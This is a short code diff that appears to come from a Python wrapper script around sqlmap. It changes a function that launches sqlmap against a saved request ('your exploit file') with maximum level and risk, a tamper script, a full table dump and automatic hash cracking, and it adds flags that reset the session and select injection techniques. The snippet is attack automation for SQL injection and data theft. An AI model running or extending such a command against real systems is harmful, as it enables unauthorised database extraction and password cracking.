@@ -79,7 +79,7 @@ def run_sqlmap():
     cmd = (
         f'python "{sqlmap_path}" -r "{modules_path}" --tamper=space2comment '
         '--dbms=mysql --time-sec=11 --random-agent --level=5 --risk=3 '
-        '--batch --union-char=UCHAR --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
+        '--batch --flush-session --technique=BEUS --union-char=UCHAR --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
     )
 
     print(Fore.YELLOW + "\n[+] Starting sqlmap with your exploit file...\n" + Style.RESET_ALL)
